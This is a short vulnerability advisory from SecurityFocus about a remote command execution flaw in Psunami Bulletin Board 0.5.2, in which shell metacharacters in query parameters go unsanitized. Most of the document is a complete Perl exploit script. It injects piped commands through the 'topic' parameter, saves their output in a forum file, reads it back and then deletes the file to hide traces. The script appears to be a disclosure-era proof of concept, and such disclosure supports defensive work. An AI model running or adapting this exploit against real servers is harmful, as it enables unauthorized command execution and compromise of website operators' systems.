source: http://www.securityfocus.com/bid/6607/info

Psunami Bulletin Board is prone to a remote command execution vulnerability.

Psunami does not sufficiently sanitize shell metacharacters from query string parameters. As a result, it may be possible for a remote attacker to execute arbitrary commands in the context of the webserver process.

	#!/usr/bin/perl
	use IO::Socket;
	#
	#
	#Psunami Bulletin Board CGI remote command execution
	#tested on version 0.5.2
	#
	#
	#
	#PsunamiBB doesn't look for escape characters in the GET variables
	#When u view a thread u can escape your command:
	#
	#http://127.0.0.1/cgi-bin/psunami.cgi?action=board&board=1&topic=1004527509
	#U can execute your command by:
	#http://127.0.0.1/cgi-bin/psunami.cgi?action=board&board=1&topic=|ls -al /|
	#
	#The command will be executed, however it will not be shown...
	#This is perlscript makes use of the forum and displays your command
	#
	#
	# usage: ./cgi.psunami.pl <hostname> <path> [urlenc cmd]
	# example: /cgi.psunami.pl 127.0.0.1 /cgi-bin/board/psunami/ ls%20-al | tr -s \\\\v \\\\n
	# //note: tr is used to convert the \n's to \v's and back, so it fits in the bbfiles
	#
	# u might have to adjust the wait times depending on connection and server
	# when there is no results, u should try again, it's often a matter of multiple tries
	# the server must also run tr, this is essential for this exploit to see the cmd output 
	#
	#
	#PsunamiBB:
	#http://psunami.sf.net/
	#
	#author:
	#dodo [dodo@fuckmicrosoft.com]
	#
	
	 if(!$ARGV[0] || !$ARGV[1])
	 {
	 print "PsunamiBB remote execution CGI exploit\nby dodo [dodo@fuckmicrosoft.com]\n\n";
	 print "usage: ./cgi.psunami.pl <hostname> <path> [urlenc cmd]\n";
	 print "example: ./cgi.psunami.pl 127.0.0.1 /cgi-bin/board/psunami/ ls%20-al | tr -s \\\\v \\\\n \n\n";
	 print "if it doesnt seemwork, try adjusting the sleep times or try multiple times\nyour command output should 
be somewhere in the html output\n";
	 exit();
	 }
	
	
	$path = $ARGV[1];
	$host = $ARGV[0];
	if (!$ARGV[2]) {
	$cmd = "uname%20-a";
	} else {
	$cmd = $ARGV[2];
	}
	
	
	$port   = 80;
	$sleep   = 2; #overal sleep
	$sleep_view  = 6; 
	$sleep_view2  = 4;
	
	
	
	
	$append = "psunami.cgi?action=topic&board=1&topic=|echo%200::dodo::0::0::%3Epsunami/board1/dodo|";
	$append1 = "psunami.cgi?action=topic&board=1&topic=|$cmd|tr%20-s%20\\\\n%20\\\\v%3E%3Epsunami/board1/dodo|";
	$append2 = 
"psunami.cgi?action=topic&board=1&topic=|cat%20psunami/board1/dodo|tr%20-d%20\\\\n%20%3Epsunami/board1/dodo|";
	$append3 = "psunami.cgi?action=topic&board=1&topic=dodo";
	$append4 = "psunami.cgi?action=topic&board=1&topic=|rm%20psunami/board1/dodo|";
	
	
	
	
	
	$i = 0;
	while ($i<5)
	{
	
	
	$socket = new IO::Socket::INET (
	    Proto    => "tcp",
	                                PeerAddr => $host,
	                                PeerPort => $port,
	    );
	
	die "unable to connect to $host:$port ($!)\n" unless $socket;
	 if ($i eq 0) {
	 print $socket "GET $path$append\nHTTP/1.0\n";
	 print "sending 1\n";
	 sleep $sleep;
	 }
	        if ($i eq 1) {
	 print $socket "GET $path$append1\nHTTP/1.0\n";
	 print "sending 2\n";
	        }
	        if ($i eq 2) {
	 print $socket "GET $path$append2\nHTTP/1.0\n";
	 print "sending 3\n";
	 }
	        if ($i eq 3) {
	 print "receiving data\n";
	 sleep $sleep_view;
	 print $socket "GET $path$append3\nHTTP/1.0\n";
	
	   while (defined($line = <$socket>)) {
	  $recv .= $line;
	   }
	 sleep $sleep_view2;
	 }
	 if ($i eq 4) {
	 print "cleaning up...";
	 sleep $sleep;
	 print $socket "GET $path$append4\nHTTP/1.0\n";
	 print "done\n";
	 }
	
	
	close($socket);
	$i++;
	}
	
	print $recv;
	print "the above is received from the server, if you have a 404 or 403, theres somethin wrong
	if not, and no command output, try again..
	if command ouput buggy, convert \\v to \\n with tr\n";